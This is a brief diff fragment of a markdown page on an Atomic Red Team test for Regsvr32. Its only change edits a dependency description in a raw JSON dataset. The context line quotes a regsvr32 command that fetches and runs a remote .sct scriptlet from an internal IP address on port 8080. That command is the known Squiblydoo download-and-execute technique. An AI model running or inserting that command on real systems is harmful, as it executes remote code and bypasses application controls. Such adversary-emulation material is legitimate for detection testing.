@@ -159,7 +159,7 @@ CommandLine: regsvr32 / s / n / u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.s
 ## Raw Dataset
 
 ```json
-[{'Atomic Red Team Test - Regsvr32': {'atomic_tests': [{'dependencies': [{'description': 'Regsvr32.exe '
+[{'Atomic Red Team Test - Regsvr32': {'atomic_tests': [{'dependencies': [{'description': 'Regsvr32.sct '
                                                                                          'must '
                                                                                          'exist '
                                                                                          'on '
